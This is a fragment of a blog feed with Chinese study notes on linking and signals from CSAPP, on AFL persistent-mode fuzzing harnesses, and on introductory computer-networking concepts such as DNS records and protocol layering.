title="重定位条目"></a>重定位条目</h2><h3 id="生成条目"><a href="#生成条目" class="headerlink" title="生成条目"></a>生成条目</h3><ul><li><p>汇编器遇到对位置未知的目标引用时，生成一个<strong>重定位条目</strong></p><ul><li>数据引用的重定位条目在<code>.rel_data</code>节中；</li><li>指令中引用的重定位条目在<code>.rel_text</code>节中；</li><li>ELF中重定位条目的格式：</li></ul><p><img src="/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/p8.png"></p></li></ul><h3 id="两种基本重定位类型"><a href="#两种基本重定位类型" class="headerlink" title="两种基本重定位类型"></a>两种基本重定位类型</h3><ul><li>R_386_PC32: 使用32位PC相对地址的引用（PC为下条指令地址）；</li><li>R_386_32: 使用32位绝对地址。</li></ul><h2 id="PC相对寻址"><a href="#PC相对寻址" class="headerlink" title="PC相对寻址"></a>PC相对寻址</h2><ul><li><p>跳转指令的机器码采用<strong>PC相关编码方式(PC-relative, Program Counter）</strong>；</p></li><li><p><strong>目标指令的地址</strong>与紧跟在<strong>跳转指令后面那条指令的地址</strong>之间的<strong>差</strong>作为编码；</p><p><img src="/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/p9.png"></p></li></ul><p>也就是<code>dst_addr = next_addr + value</code></p><h1 id="第八章-异常控制流"><a href="#第八章-异常控制流" class="headerlink" title="第八章 异常控制流"></a>第八章 异常控制流</h1><h2 id="回收子进程"><a href="#回收子进程" class="headerlink" title="回收子进程"></a>回收子进程</h2><p>当一个进程由于某种原因终止时，内核并不是立即把它从系统中清除。相反，进程被保持在一种已终止的状态中，直到被它的父进程<strong>回收（reap）</strong>。当父进程回收己终止的子进程时，内核将子进程的退出状态传递给父进程，然后抛弃巳终止的进程，从此时开始，该进程就不存在了。</p><p>一个终止了但还未被回收的进程称为<strong>僵死进程 (zombie)</strong></p><h3 id="waitpid"><a href="#waitpid" class="headerlink" title="waitpid()"></a>waitpid()</h3><p><code>pid_t waitpid(pid_t pid, int *Status, int options); </code></p><ol><li>判断等待集合的成员：<ul><li>如果pid&gt;0，则等待的是一个单独的子进程。</li><li>如果pid = -1 ，那么等待的是由父进程所有的子进程组成。</li></ul></li><li>修改默认行为<ul><li>可以通过将 options 设置为常量 WNOHANG 和 WUNTRACED 的各种组合，修改默认行为。</li><li>WNOHANG：若等待集合中任何子进程都未终止，则立即返回。返回值为0。</li><li>WUNTRACED：挂起调用进程的执行，直到等待集合中一个进程为已终止或被停止。返回的pid是导致这个结果的子进程pid。原本默认的行为是只返回已终止的子进程，当想检查被停止及已终止进程时，这个选项会有用。</li><li>WNOHANG|WUNTRACED：立即返回，如果等待集合中，没有任何子进程被停止或已终止，则返回值为0。</li></ul></li><li>检查已回收子进程的退出状态<ul><li>WIFEXITED（status）：如果子进程通过调用exit返回或return正常返回，返回值为true；</li><li>WEXITSTATUS（status）：返回一个正常终止的子进程的退出状态。</li><li>WIFSIGNALED（status）：如果一个子进程是因为一个未捕获的信号终止的，返回真。</li><li>等等</li></ul></li><li>错误条件<ul><li>调用程序无子进程：waitpid 返回值为-阿，error设置为ECHILD；</li><li>waitpid 被信号中断，返回-1，error为EINTR。</li></ul></li></ol><h2 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h2><p>一个信号就是一条小消息，它通知进程系统中发生了一个某种类型的事件。</p><h3 id="信号术语"><a href="#信号术语" class="headerlink" title="信号术语"></a>信号术语</h3><ul><li>发送信号<ul><li>内核检查到一个系统事件，如除以0或者子进程终止；</li><li>一个进程调用了 kill 函数，显示地要求内核发送一个信号给目的进程。</li></ul></li><li>接收信号<ul><li>当目的进程被内核强迫以某种方式对信号的发送做出反应，目的进程就<strong>接收</strong>了信号。进程可以忽略这个信号，终止，或者通过执行一个称为<strong>信号处理程序（signal handler）</strong>的用户层函数<strong>捕获</strong>这个信号。</li></ul></li></ul><p>一个只发出而没有被接收的信号称为<strong>待处理信号（pending signal）</strong>。任何时刻，一个类型至多只会有一个待处理信号。先到的信号保留，后到的信号直接丢弃。</p><h3 id="进程组"><a href="#进程组" class="headerlink" title="进程组"></a>进程组</h3><p>每个进程都只属于一个<strong>进程组</strong>，进程组是由一个正整数进程组ID来标识的。</p><p><code>pid_t getpgrp(void)</code></p><p>默认的，子进程和父进程属于同一个进程组。可以通过<code>setpgid(pid_t pid, pid_t pgid)</code>来设置进程的进程组。如果 pid 设置为0，就是当前进程的 pid。如果 pgid 是0，就用 pid 指定的进程 pid 作为进程组 pid。（新进程组）</p><p><strong>/bin/kill</strong>发送信号：<code>/bin/kill -9 15213</code></p><p>将信号9（SIGKILL）发送到进程15213。如果pid为负，则将信号发送到进程组pid中每个进程</p><figure class="highlight plaintext"><figcaption><span>-9 -15213```就将信号发送到进程组15213中每个进程。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs /bin/kill"><br>### 接收信号<br><br>进程可以使用```signal```函数修改和信号相关联的默认行为。除了 SIGSTOP &amp; SIGKILL 这两个的默认行为是不能被修改的。<br><br>```c<br>typedef void (*sighandler_t)(int);<br><br>sighandler_t signal(int signum, sighandler_t handler);<br></code></pre></td></tr></table></figure><ul><li>若handler 是 SIG_IGN ，那么忽略前面的信号；</li><li>若handler 是 SGI_DFL ，那么类型为 signum 的信号回到默认行为；</li><li>否则，handler就是用户定义的函数的地址，这个函数称为信号处理程序（signal handler）。只要程序接收到对应的信号，就会调用这个程序。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Persistent Mode</title>
    <link href="/2023/03/14/Persistent-Mode/"/>
    <url>/2023/03/14/Persistent-Mode/</url>
    
    <content type="html"><![CDATA[<h1 id="Forkserver-Persistent-Mode"><a href="#Forkserver-Persistent-Mode" class="headerlink" title="Forkserver Persistent Mode"></a>Forkserver Persistent Mode</h1><h2 id="Persistent-Mode"><a href="#Persistent-Mode" class="headerlink" title="Persistent Mode"></a>Persistent Mode</h2><p>AFL 中采用 Forserver 来加快程序运行效率，其原理是利用 Forkserver 机制 fork() 出子程序进行执行，取代了 execve() 的执行模式，避免了大量重复的链接等操作，大大提升了 Fuzz 的速率。</p><p>进一步看，由于某些库提供的 API 是无状态的，或能重置其状态，在一次次循环之间。当 API 重置后，一个长期活跃的进程就可以被重复使用，这样可以消除 fork() 函数以及 OS 相关的消耗。</p><p>通常，Persistent Mode 下，程序可有 x10 ~ x20 倍的速率提升。</p><h3 id="使用-Persistent-Mode"><a href="#使用-Persistent-Mode" class="headerlink" title="使用 Persistent Mode"></a>使用 Persistent Mode</h3><p>使用 Persistent Mode 很简单，只需要修改 target 程序为一个确定的模式即可</p><figure class="highlight c"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;what_you_need_for_your_target.h&quot;</span></span><br><span class="hljs-comment">//引用有目标无状态 API 的库</span><br>__AFL_FUZZ_INIT();<br><br>main() &#123;<br><br>  <span class="hljs-comment">// anything else here, e.g. command line arguments, initialization, etc.</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL</span><br>  __AFL_INIT();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf = __AFL_FUZZ_TESTCASE_BUF;  <span class="hljs-comment">// must be after __AFL_INIT</span><br>                                                 <span class="hljs-comment">// and before __AFL_LOOP!</span><br><br>  <span class="hljs-keyword">while</span> (__AFL_LOOP(<span class="hljs-number">10000</span>)) &#123;<br><br>    <span class="hljs-type">int</span> len = __AFL_FUZZ_TESTCASE_LEN;  <span class="hljs-comment">// don&#x27;t use the macro directly in a</span><br>                                        <span class="hljs-comment">// call!</span><br><br>    <span class="hljs-keyword">if</span> (len &lt; <span class="hljs-number">8</span>) <span class="hljs-keyword">continue</span>;  <span class="hljs-comment">// check for a required/useful minimum input length</span><br><br>    <span class="hljs-comment">/* Setup function call, e.g. struct target *tmp = libtarget_init() */</span><br>    <span class="hljs-comment">/* Call function to be fuzzed, e.g.: */</span><br>    target_function(buf, len);<br>    <span class="hljs-comment">/* Reset state. e.g. libtarget_free(tmp) */</span><br><br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>以下为两个例子<br>对 capstone 进行 fuzz</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;capstone/include/capstone.h&quot;</span> <span class="hljs-comment">// 引用capstone内无状态库</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>    csh handle;<br>    cs_insn *insn;<br>    <span class="hljs-type">size_t</span> count;<br>    <span class="hljs-type">uint8_t</span> buf[<span class="hljs-number">128</span>]; <br>    <span class="hljs-type">ssize_t</span> read_bytes;<br><br>    <span class="hljs-keyword">while</span> (__AFL_LOOP(<span class="hljs-number">1000</span>)) &#123;<br>        <span class="hljs-comment">// (re-) initialize the library and read new input</span><br>        read_bytes = <span class="hljs-number">-1</span>; <br>        <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>);<br>        read_bytes = read(STDIN_FILENO, buf, <span class="hljs-number">128</span>);<br><br>        <span class="hljs-keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle) == CS_ERR_OK) &#123;<br>            <span class="hljs-comment">// disassemble the bytes we just read using capstone</span><br>            count = cs_disasm(handle, buf, read_bytes, <span class="hljs-number">0x1000</span>, <span class="hljs-number">0</span>, &amp;insn);<br><br>            <span class="hljs-comment">// Don&#x27;t leak memory. This is especially important in persistent mode, </span><br>            <span class="hljs-comment">// because we reuse the process a significant number of times</span><br>            cs_free(insn, count); <br>        &#125;<br>        cs_close(&amp;handle);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对某程序进行 fuzz</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ft2build.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> FT_FREETYPE_H</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span>&#123;<br>    FT_Library lib = <span class="hljs-literal">NULL</span>;<br>    FT_Face face = <span class="hljs-literal">NULL</span>;<br>    FT_Init_FreeType(&amp;lib);<br><br>    <span class="hljs-keyword">while</span>(__AFL_LOOP(<span class="hljs-number">1000</span>)) &#123;<br>        face = <span class="hljs-literal">NULL</span>;<br>        FT_New_Face(lib, argv[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>, &amp;face);<br>        FT_Done_Face(face);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>**注意：重置状态时应尽力避免 memory leak **</p><h3 id="AFL-LOOP"><a href="#AFL-LOOP" class="headerlink" title="__AFL_LOOP"></a>__AFL_LOOP</h3><p>_AFL_LOOP 的宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> __AFL_LOOP(_A)  \</span><br><span class="hljs-meta">(&#123; \</span><br><span class="hljs-meta">    static volatile char *_B __attribute__((used));  \</span><br><span class="hljs-meta">    _B = (char*)<span class="hljs-string">&quot;##SIG_AFL_PERSISTENT##&quot;</span>; \</span><br><span class="hljs-meta">    __attribute__((visibility(<span class="hljs-string">&quot;default&quot;</span>))) int _L(unsigned int) __asm__(<span class="hljs-string">&quot;__afl_persistent_loop&quot;</span>); \</span><br><span class="hljs-meta">    _L(_A); \</span><br><span class="hljs-meta">&#125;)</span><br></code></pre></td></tr></table></figure><p>宏定义 <code>__AFL_LOOP</code>内部调用<code>__afl_persistent_loop</code>函数</p><p>该函数源代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* A simplified persistent mode handler, used as explained in README.llvm. */</span><br><br><span class="hljs-type">int</span> __afl_persistent_loop(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_cnt) &#123;<br><br>  <span class="hljs-type">static</span> u8  first_pass = <span class="hljs-number">1</span>;<br>  <span class="hljs-type">static</span> u32 cycle_cnt;<br><br>  <span class="hljs-keyword">if</span> (first_pass) &#123;<br><br>    <span class="hljs-comment">/* Make sure that every iteration of __AFL_LOOP() starts with a clean slate.</span><br><span class="hljs-comment">      On subsequent calls, the parent will take care of that, but on the first</span><br><span class="hljs-comment">      iteration, it&#x27;s our job to erase any trace of whatever happened</span><br><span class="hljs-comment">      before the loop. */</span><br><br>    <span class="hljs-keyword">if</span> (is_persistent) &#123;<br>     <span class="hljs-comment">// 重置共享内存</span><br>      <span class="hljs-built_in">memset</span>(__afl_area_ptr, <span class="hljs-number">0</span>, MAP_SIZE);<br>      __afl_area_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>      __afl_prev_loc = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    cycle_cnt  = max_cnt;<br>    first_pass = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (is_persistent) &#123;<br><br>    <span class="hljs-keyword">if</span> (--cycle_cnt) &#123;<br><br>      raise(SIGSTOP);<br><br>      __afl_area_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>      __afl_prev_loc = <span class="hljs-number">0</span>;<br><br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>      <span class="hljs-comment">/* When exiting __AFL_LOOP(), make sure that the subsequent code that</span><br><span class="hljs-comment">        follows the loop is not traced. We do that by pivoting back to the</span><br><span class="hljs-comment">        dummy output region. */</span><br><br>      __afl_area_ptr = __afl_area_initial;<br><br>    &#125;<br><br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络</title>
    <link href="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    <url>/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章-计算机网络和因特网"><a href="#第一章-计算机网络和因特网" class="headerlink" title="第一章-计算机网络和因特网"></a>第一章-计算机网络和因特网</h1><h2 id="因特网构成"><a href="#因特网构成" class="headerlink" title="因特网构成"></a>因特网构成</h2><ul><li>手机、电脑、电视等接入互联网的“物品”称为<strong>主机（host）</strong>或<strong>端系统（end system）</strong>；</li><li>链接上述终端的是<strong>通信链路（communication link）</strong> 和 <strong>分组交换机（packet switch）</strong>；</li><li>链路有**传输速率（transmission rate)**，单位是比特每秒（bps）；</li><li>端向端发送的数据，分段后加上首部字节，这些信息包称为<strong>分组（packet）</strong>；</li><li>两条链路间，转发分组的称为<strong>分组交换机</strong>，最著名的如<strong>路由器（router）</strong>和<strong>链路层交换机（link-layer switch)</strong>;</li><li>端到端之间，一个分组经历的所有链路和分组交换机称为<strong>路径（route 或 path）</strong>；</li><li>端系统通过<strong>因特网服务提供商（Internet Service Provider， ISP）</strong>接入因特网；</li><li>以上因特网部件都要运行一系列<strong>协议（protocol）</strong>，<strong>TCP（Transmission Control Protocol，传输控制协议）</strong>和<strong>IP（Internet Protocol，网际协议）</strong>是两个最重要的协议；</li><li>IP协议定义了在路由器与端系统之间发送和接收的分组格式；</li><li>设计多个端交互数据的程序，称为<strong>分布式应用程序（distributed application）</strong>；</li></ul><h2 id="What-is-Protocol"><a href="#What-is-Protocol" class="headerlink" title="What is Protocol ?"></a>What is Protocol ?</h2><p><strong>协议（protocol）</strong>定义了两个或多个通信实体间交换的报文的格式和顺序，以及发送/接收报文时采取的动作。</p><h2 id="接入网"><a href="#接入网" class="headerlink" title="接入网"></a>接入网</h2><p>这是指将端系统物理连接到其<strong>边缘路由器（edge router）</strong>的网络。<br>边缘路由器是端系统到任何其他远程端系统的路径上的第一台路由器。<br>住户通常从提供本地电话接入的本地电话公司处获得<strong>数字用户线（Digital SubscriberDSL）</strong>因特网接入。因此，当使用DSL时，用户的本地电话公司也是它的ISP。</p><h2 id="卫星无线电信道"><a href="#卫星无线电信道" class="headerlink" title="卫星无线电信道"></a>卫星无线电信道</h2><p>通常使用两类卫星：<strong>同步卫星（geostationary)<strong>和</strong>近地轨道卫星（Low-Earth Orbiting, LEO）</strong>；</p><h2 id="存储转发传输"><a href="#存储转发传输" class="headerlink" title="存储转发传输"></a>存储转发传输</h2><p>存储转发传输指交换机开始向输出链路传输该分组第一个bit前，必须先完整收到整个分组。</p><h2 id="电路交换"><a href="#电路交换" class="headerlink" title="电路交换"></a>电路交换</h2><p>网络链路和交换机移动数据有两种基本方法：<strong>电路交换（circuit switching）</strong>和<strong>分组交换（packet switching)</strong><br>链路中的电路是通过<strong>频分复用 (Frequency- Division Multiplexing, FDM )<strong>或</strong>时分复用<br>（Time-Division Multiplexing, TDM）</strong>来实现的。</p><h2 id="时延"><a href="#时延" class="headerlink" title="时延"></a>时延</h2><p>这些时延最为重要的是<strong>节点处理时延(nodal processing delay) <strong>、</strong>排队时延(queuing delay)<strong>、</strong>传输时延<br>(transmission delay)<strong>和</strong>传播时延(propagation delay)</strong>,这些时延总体累加起来是**节点总时延(tolal nodal delay)**。<br><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p1.png"></p><p>令Q表示分组到达队列的平均速率（a的单位是分组/秒，即pkt/s）o前面讲过尺是传输速率，即从队列中推出比特的速率（以bps即b/s为单位）。为了简单起见，也假定所有分组都是由厶比特组成的。则比特到达队列的平均速率是La bps。最后，假定该队列非常大，因此它基本能容纳无限数量的比特。比率<code>La/R</code>被称为流量强度（traffic intensity）,它在估计排队时延的范围方面经常起着重要的作用。如果La/R&gt;l,则比特到达队列的平均速率超过从该队列传输岀去的速率。在这种不幸的情况下，该队列趋向于无限增加，并且排队时延将趋向无穷大！因此，流量工程中的一条金科玉律是：设计系统时流量强度不能大于1</p><h2 id="协议分层"><a href="#协议分层" class="headerlink" title="协议分层"></a>协议分层</h2><p>下层为上一层提供<strong>服务（service）</strong>，各层的所有协议称为协议栈（protocol stack）。<br><strong>因特网</strong>的协议栈由5个层次组成：物理层、链路层、网络层、运输层和应用层</p><ul><li>应用层信息分组：报文（message）；</li><li>运输层：报文段（segment）；</li><li>网络层：数据报（datagram）；</li><li>链路层：帧（frame）；</li><li>物理层；</li></ul><p><strong>OSI模型</strong><br>应用层、表示层、会话层、运输层、网络层、数据链路层、物理层。</p><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>封装（encapsulation）。一个应用层报文传送给运输层，首部会附带上附加信息，这些一起构成了运输层报文段。再加上另外的首部信息，给到网络层，生成了网络层数据包。接下来生成链路层帧。<br>一个分组具有两种类型的字段：首部字段和**有效载荷字段（payload field） **<br><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p2.png"></p><p><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p3.png"><br><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p4.png"><br><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p5.png"></p><h1 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h1><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>DNS：Domain Name System 域名系统。</p><p>DNS 是：</p><ul><li>一个由分层的 <strong>DNS 服务器</strong>实现的分布式数据库；</li><li>一个使得主机能够查询分布式数据库的应用层协议。</li></ul><p>DNS 服务器通常是运行在 BIND （Berkeley Internet Nmae Domain)软件的 UNIX 机器。DNS 协议 运行在 UDP 上使用 53 端口。</p><p>DNS 将用户提供的主机名（<a href="http://www.kawa.com/">www.kawa.com</a> 类似的）解析为 IP 地址。</p><p>DNS 可以将主机别名进行解析，方便使用</p><h3 id="DNS-的记录和报文"><a href="#DNS-的记录和报文" class="headerlink" title="DNS 的记录和报文"></a>DNS 的记录和报文</h3><p>共同实现 DNS 分布式数据库的所有 DNS 服务器存储了 **资源记录（Resource Record)**，RR 提供主机名到 IP 地址的映射。<br>RR 包含以下字段的四元组：</p><figure class="highlight delphi"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs delphi">(<span class="hljs-keyword">Name</span>, Value, <span class="hljs-keyword">Type</span>, TTL)<br></code></pre></td></tr></table></figure><p>TTL 是记录的生存时间，它决定了资源记录应当从缓存中删除的时间。<br>Name 和 Value 的值取决于 Type：</p><ul><li>若 Type = A ，则 Name 是主机名， Value 是该主机名对应的 IP 地址。</li><li>若 Type = NS，则 Name 是个域（如 foo.com），而 value 是个知道如何获得该域<br>中主机IP地址的权威DNS服务器的主机名，例如(foo.com, dns.foo.com, NS）</li><li>若 Type = CNAME，则 Value 是别名为 Name 的主机对应的规范主机名。例如(foo.com, relay1.bar. foo. com, CNAME)就是一条 CNAME 类型的记录。</li><li>若 Type = MX，则Value 是个别名为 Name 的邮件服务器的规范主机名。举例来说，(foo.com, mail. bar. foo. com, MX)就是一条MX记录。</li></ul><p><strong>DNS报文</strong></p><p><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p6.png"></p><ul><li>前12字节是首部区域</li></ul><h2 id="P2P-文件分发"><a href="#P2P-文件分发" class="headerlink" title="P2P 文件分发"></a>P2P 文件分发</h2><p><strong>最稀缺优先（rarest first）</strong>，针对自身没有的块，优先在其邻居中决定最稀缺的块（副本数最少的块），并请求之。</p><h2 id="视频流和内容分发网"><a href="#视频流和内容分发网" class="headerlink" title="视频流和内容分发网"></a>视频流和内容分发网</h2><p><strong>经 HTTP 的动态适应流 (Dynamic Adaptive Streaming over HTTP, DASH)</strong><br>在 DASH 中，视频编码为几个不同的版本，每个版本由不同的比特率，对应不同质量水平。</p><p><strong>内容分发网（Content Distribution Network，CDN）</strong><br>CDN管理分布在多个地理位置上的服务器，在它的服务器中存储视频（和其他类型的Web内容，包括文档、图片和音频）的副本，并且所有试图将每个用户请求定向到一个将提供最好的用户体验的CDN位置。<br>CDN 可以是专用 CDN ，也可以是第三方 CDN。<br>CDN 部署核心是<strong>集群选择策略（cluster selection strategy)</strong>,即动态地将用户定向到 CDN 中某个服务器集群或数据中心。<br>一种策略是<strong>地理上最为接近（geographically closest）</strong>的集群。</p><hr><h1 id="系统性学习"><a href="#系统性学习" class="headerlink" title="系统性学习"></a>系统性学习</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="信道"><a href="#信道" class="headerlink" title="信道"></a>信道</h3><p>就是传送信息的通道</p><h3 id="信道的类型"><a href="#信道的类型" class="headerlink" title="信道的类型"></a>信道的类型</h3><p>物理信道 &amp; 逻辑信道</p><h3 id="信道的带宽"><a href="#信道的带宽" class="headerlink" title="信道的带宽"></a>信道的带宽</h3><p>带宽指的是：某个信道在单位时间内最大能传输多少bit的信息。<br>在计算机领域中，带宽指数字带宽，单位是“比特率”或“字节率”。</p><h3 id="带宽的单位"><a href="#带宽的单位" class="headerlink" title="带宽的单位"></a>带宽的单位</h3><p>大写字母 <code>B</code>表示“字节”，小写字母 <code>b</code> 表示“比特”。<br>【10进制】中，K 表示 1000 ， M 表示 1000 x 1000；<br>【2进制】中，K 表示 1024， 表示 1024 x 1024；</p><p>国际上的约定：若是二进制，在 K 后面加一个 i ；<br>如：<br>1Kbps 表示“1000比特每秒”；<br>1KiBps 表示“1024字节每秒”；</p><h3 id="信道工作模式：-单工、半双工、全双工"><a href="#信道工作模式：-单工、半双工、全双工" class="headerlink" title="信道工作模式： 单工、半双工、全双工"></a>信道工作模式： 单工、半双工、全双工</h3><h4 id="单工"><a href="#单工" class="headerlink" title="单工"></a>单工</h4><p>方向单一，如电台 -&gt; 收音机 可以，但收音机 -&gt; 电台 是不行的。</p><h4 id="半双工"><a href="#半双工" class="headerlink" title="半双工"></a>半双工</h4><p>方向双向，但同一时刻只能有一个方向进行传输数据。<br>类似火车轨道，双向都能走，但是不能同时两个方向都来车（撞车了）。</p><h4 id="全双工"><a href="#全双工" class="headerlink" title="全双工"></a>全双工</h4><p>【同时相向】传播可行。<br>如：光纤。</p><h2 id="从“分层”到“参考模型”"><a href="#从“分层”到“参考模型”" class="headerlink" title="从“分层”到“参考模型”"></a>从“分层”到“参考模型”</h2><h3 id="分层"><a href="#分层" class="headerlink" title="分层"></a>分层</h3><p>对于网络通讯，不太可能用一种通讯协议完成所有的信息传递任务，故需要多种协议。<br>采用【分层】的设计思路，让多个层次的协议在一起协同工作，技术上称作“协议栈”（protocol stack）。</p><h3 